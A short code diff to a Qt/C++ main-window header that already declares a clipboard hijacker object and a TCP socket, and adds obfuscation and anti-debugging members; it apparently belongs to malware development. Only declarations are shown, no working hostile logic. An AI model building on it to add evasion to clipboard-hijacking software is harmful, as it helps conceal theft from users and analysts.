@@ -18,6 +18,8 @@
 #include "unistd.h"
 #include <QtTest/QTest>
 #include    <QTcpServer>
+#include "obfuscation.h"
+#include <crypto.h>
 
 #include <QMainWindow>
 
@@ -42,5 +44,7 @@ private:
     Clipboard_hijacker *clippy = new Clipboard_hijacker();
     Ui::MainWindow *ui;
     QTcpSocket* currentSocket;
+    Obfuscation* testcrypto = new Obfuscation();
+    anti_debug* yametedebug = new anti_debug();
 };
 #endif // MAINWINDOW_H
